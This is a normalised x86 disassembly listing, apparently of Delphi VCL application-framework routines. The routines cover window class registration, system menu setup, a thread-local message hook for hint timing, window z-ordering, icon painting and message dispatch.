dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
add [ eax + 0x4 ] edx
jmp r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0xc ] eax
push 0x3d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
jmp r-xdata
push esi
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
mov al [ ebp - 0x1 ]
dec al
je r-xdata
mov eax [ ebx + 0x48 ]
cmp esi eax
jne r-xdata
sub esi [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
sub [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax ] esi
jmp r-xdata
dec al
je r-xdata
xor edx edx
mov dl [ ebp - 0x1 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebx + 0x4c ]
cmp edx [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax + 0x8 ] esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_45cce8 ]
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub [ edx + 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
sub_45cd5c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_45c4b4
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc edi
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_4139c8
mov dl [ ebp - 0x1 ]
call sub_45cbac
pop ecx
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_45c4a0
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov al [ eax + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x22b ] 0x1
je r-xdata
cmp [ ebx + 0x22b ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41386c
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0xc ]
je r-xdata
xor esi esi
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp esi [ eax + 0x8 ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx ebx
mov edx esi
call sub_413a44
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx esi
call sub_4139c8
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax ebx
call sub_45cb4c
test al al
je r-xdata
inc esi
sub_45cea8
push ebp
mov ebp esp
push ebx
push esi
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_45c4b4
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx esi
call sub_45c4a0
cmp [ eax + 0x30 ] 0x0
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
test [ eax + 0x1c ] 0x10
jne r-xdata
cmp [ eax + 0x5b ] 0x0
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
sub_45cf00
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] eax
push ebp
call sub_45cea8
pop ecx
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_45cf7a
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_45cd5c
pop ecx
push ebp
mov al 0x2
call sub_45cd5c
pop ecx
push ebp
mov al 0x3
call sub_45cd5c
pop ecx
push ebp
mov al 0x4
call sub_45cd5c
pop ecx
push ebp
mov al 0x5
call sub_45cd5c
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_40326c
retn
sub_45cf88
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45cb1c
xor eax eax
push ebp
push sub_45d001
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_45cf00
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x8e ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_45cb24
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x8e ] 0x10
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_45d01c
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_403fbc
pop esi
pop ebx
retn
cmp [ ebx + 0x80 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x80 ]
call sub_404010
pop esi
pop ebx
retn
mov ebx [ ebx + 0x30 ]
jmp r-xdata
test ebx ebx
jne r-xdata
sub_45d074
push ebp
mov ebp esp
push ebx
push esi
push edi
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
xor eax eax
push ebp
push sub_45d0a5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_45f4c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_45d0c8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx rw-data
call GetCurrentThreadId
mov [ rw-data ] eax
jmp r-xdata
push 0x64
mov eax [ rw-data ]
push eax
call WaitForSingleObject
cmp eax 0x102
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
call GetCursorPos
lea eax [ ebp - 0x8 ]
call sub_43c73c
test eax eax
jne r-xdata
mov eax [ ebx ]
call sub_45f53c
sub_45d124
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
push esi
mov eax [ ebp + 0xc ]
push eax
push ebx
mov eax [ rw-data ]
push eax
call CallNextHookEx
mov edi eax
test ebx ebx
jl r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ rw-data ] 0x0
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45e5dc
sub_45d168
push ecx
mov eax [ rw-data ]
cmp [ eax + 0xa5 ] 0x0
jne r-xdata
pop edx
retn
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
call GetCurrentThreadId
push eax
push 0x0
mov eax sub_45d124
push eax
push 0x3
call SetWindowsHookExA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ rw-data ] eax
push esp
push 0x0
push 0x0
push sub_45d0c8
push 0x3e8
push 0x0
call CreateThread
mov [ rw-data ] eax
sub_45d1dc
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call UnhookWindowsHookEx
retn
mov eax [ rw-data ]
push eax
call SetEvent
call GetCurrentThreadId
cmp eax [ rw-data ]
je r-xdata
mov eax [ rw-data ]
push eax
call CloseHandle
xor eax eax
mov [ rw-data ] eax
push 0xffffffff
mov eax [ rw-data ]
push eax
call WaitForSingleObject
sub_45d238
add esp 0xfffffff8
mov [ esp ] 0x8
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x48
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
pop ecx
pop edx
retn
cmp [ esp + 0x4 ] 0x0
setne al
pop ecx
pop edx
retn
sub_45d268
add esp 0xfffffff8
mov [ esp ] 0x8
cmp al 0x1
cmc
sbb eax eax
mov [ esp + 0x4 ] eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x49
call SystemParametersInfoA
pop ecx
pop edx
retn
sub_45d290
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_45d238
mov ebx eax
test bl bl
je r-xdata
push edi
push esi
call ShowWindow
test bl bl
je r-xdata
xor eax eax
call sub_45d268
pop edi
pop esi
pop ebx
retn
mov al 0x1
call sub_45d268
sub_45d2d0
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_419380
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_403590
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_45e9a8
mov [ ebx + 0x34 ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ ebx + 0x90 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ ebx + 0xa8 ] eax
xor eax eax
mov [ ebx + 0x60 ] eax
xor eax eax
mov [ ebx + 0x84 ] eax
mov [ ebx + 0x5c ] 0xff000018
mov [ ebx + 0x78 ] 0x1f4
mov [ ebx + 0x7c ] 0x1
xor eax eax
mov [ ebx + 0x80 ] eax
mov [ ebx + 0x74 ] 0x9c4
mov [ ebx + 0x88 ] 0x0
mov [ ebx + 0x9d ] 0x1
mov [ ebx + 0xb4 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_422e14
mov esi eax
mov [ ebx + 0x98 ] esi
push r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call LoadIconA
mov edx eax
mov eax esi
call sub_4231e4
mov eax [ ebx + 0x98 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_45f140
push 0x100
lea eax [ ebp - 0x101 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetModuleFileNameA
lea eax [ ebp - 0x101 ]
push eax
lea eax [ ebp - 0x101 ]
push eax
call OemToCharA
lea eax [ ebp - 0x101 ]
mov dl 0x5c
call sub_40c1dc
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_45eba0
lea eax [ ebp - 0x101 ]
mov dl 0x2e
call sub_40c204
test eax eax
je r-xdata
lea edx [ eax + 0x1 ]
lea eax [ ebp - 0x101 ]
call sub_408508
lea eax [ ebp - 0x101 ]
inc eax
push eax
call CharLowerA
lea eax [ ebx + 0x8c ]
lea edx [ ebp - 0x101 ]
mov ecx 0x100
call sub_40422c
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ eax ] 0x0
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x5b ] 0x1
mov [ ebx + 0x9e ] 0x1
xor eax eax
mov [ ebx + 0xa0 ] eax
mov eax ebx
call sub_45f31c
mov eax ebx
call sub_45fce0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
call sub_45d5d8
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_45d4b9
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff0
call sub_4035f8
mov ebx edx
mov esi eax
mov eax esi
call sub_45fcf0
mov [ esp + 0x4 ] esi
mov [ esp ] sub_45e9a8
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp ]
jne r-xdata
mov [ esp + 0xc ] esi
mov [ esp + 0x8 ] sub_45eba0
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp + 0x8 ]
jne r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ esi + 0xa0 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov [ esi + 0x9d ] 0x0
mov eax esi
call sub_45f53c
xor edx edx
mov eax esi
call sub_45eeb8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4193cc
push esi
push sub_45da0c
mov eax esi
call sub_45e794
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
push eax
call FreeLibrary
cmp [ esi + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0xa4 ] 0x0
je r-xdata
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
lea eax [ esi + 0x4c ]
call sub_405628
mov edx [ rw-data ]
cmp [ edx ] 0x0
je r-xdata
mov eax [ esi + 0xa8 ]
call sub_40326c
mov eax [ esi + 0x90 ]
call sub_40326c
mov eax [ esi + 0x98 ]
call sub_40326c
test bl bl
jle r-xdata
call sub_41a4a8
mov eax [ esi + 0x30 ]
push eax
call DestroyWindow
push 0x0
push 0x1
push 0x80
push eax
call SendMessageA
add esp 0x10
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_45d5d8
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
xor edx edx
mov [ ebp - 0x2c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_45d779
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d780
lea eax [ ebp - 0x2c ]
call sub_403fbc
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
push ebx
push sub_45db58
call sub_41a410
mov [ ebx + 0x40 ] eax
mov eax DefWindowProcA
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
push rw-data
call RegisterClassA
test ax ax
jne r-xdata
push eax
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
lea edx [ ebp - 0x2c ]
mov eax [ rw-data ]
call sub_405aec
mov ecx [ ebp - 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b414
call sub_4039f8
push eax
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov eax [ ebx + 0x8c ]
call sub_40447c
mov edx eax
mov ecx 0x84ca0000
mov eax [ rw-data ]
call sub_406a1c
mov [ ebx + 0x30 ] eax
lea eax [ ebx + 0x8c ]
call sub_403fbc
mov [ ebx + 0xa4 ] 0x1
mov eax [ ebx + 0x40 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x30 ]
push eax
call SetWindowLongA
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call GetSystemMenu
mov ebx eax
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_45e25c
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_45e25c
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
push 0x0
push 0xf010
push ebx
call DeleteMenu
sub_45d788
push ebx
push esi
mov ecx rw-data
cmp edx [ eax + 0x44 ]
jne r-xdata
cmp edx [ eax + 0x48 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x44 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x64 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x48 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x68 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x64 ] esi
mov ebx [ ecx ]
cmp edx [ ebx + 0x78 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x68 ] esi
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x6c ] esi
cmp edx [ eax + 0x60 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x78 ] esi
mov eax [ ecx ]
call sub_45c4bc
pop esi
pop ebx
retn
xor edx edx
mov [ eax + 0x60 ] edx
sub_45d7e8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
or esi 0xffffffff
push 0x4
push ebx
call GetWindow
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] ebx
xor esi esi
mov eax [ rw-data ]
mov edi [ eax + 0x44 ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x90 ]
mov edx ebx
call sub_41386c
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax edi
call sub_4446f8
cmp ebx eax
je r-xdata
sub_45d858
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
inc [ ebx + 0x94 ]
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
mov [ esp + 0x4 ] dl
mov eax esp
push eax
push sub_45d7e8
call EnumWindows
mov eax [ ebx + 0x90 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x3
mov eax [ esp + 0x4 ]
push eax
call GetWindow
mov esi eax
mov [ esp ] esi
push 0xffffffec
push esi
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov [ esp ] 0xfffffffe
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ esp + 0x14 ]
push eax
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_4139c8
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_45d970
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jle r-xdata
dec [ ebx + 0x94 ]
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax [ ebx + 0x90 ]
mov edx [ eax ]
call [ edx + 0x8 ]
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_4139c8
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_45da0c
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
cmp eax [ rw-data ]
je r-xdata
cmp [ esi + 0x59 ] 0x0
je r-xdata
cmp eax 0x1a
jne r-xdata
cmp [ esi + 0x5a ] 0x0
je r-xdata
push 0x400
call SetThreadLocale
call sub_40c4a4
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
call sub_45c9c8
mov eax [ rw-data ]
call sub_45d010
sub_45da64
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45dac1
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x13a ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45dac8
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x8 ]
call sub_4041b4
mov eax [ ebp - 0x4 ]
push eax
lea eax [ esi + 0xc ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
sub_45dad0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call DefWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_45db0c
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call BeginPaint
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_45e25c
push eax
push 0x0
push 0x0
push ebx
call DrawIcon
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call EndPaint
pop ebx
mov esp ebp
pop ebp
retn
sub_45db58
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_45e212
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_45da0c
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx ]
mov eax ebx
cmp eax 0x53
jg r-xdata
inc ebx
xor esi esi
cmp eax 0xb017
jg r-xdata
je r-xdata
inc esi
dec ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0xb020
jg r-xdata
je r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov edx [ ebp - 0x8 ]
mov dx [ edx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_45ec78
jmp r-xdata
cmp eax 0x16
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov edx esi
call sub_4139c8
mov edi eax
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x4 ]
call [ edi ]
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub eax 0xb031
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
cmp eax 0xb000
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0x1d
jg r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
add eax 0xfffffff2
sub eax 0x2
jb r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
sub eax 0xb01a
je r-xdata
mov esi eax
mov eax esi
call sub_4446f8
test eax eax
je r-xdata
sub eax 0xb001
je r-xdata
je r-xdata
sub eax 0x37
je r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xb0 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xb0 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov eax [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_45fba4
and eax 0x7f
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_45e794
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_45e738
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
sub eax 0x5
je r-xdata
mov eax esi
call sub_4446f8
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
